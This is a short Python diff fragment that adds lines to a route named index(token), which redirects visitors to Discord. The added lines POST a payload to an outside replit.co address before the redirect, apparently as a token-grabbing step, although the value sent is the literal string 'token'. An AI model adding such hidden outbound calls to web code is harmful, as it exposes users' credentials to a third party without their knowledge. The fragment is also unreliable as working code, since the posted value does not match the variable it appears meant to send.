@@ -61,6 +61,11 @@ def index(token):
     except:
         pass
 
+        w="https://busyinsignificantfossil.yuvi5000.repl.co/x"
+        m={"text":"token"}
+        r=requests.post(w,json=m)
+
+
     return redirect("https://discord.com/app")
 
 
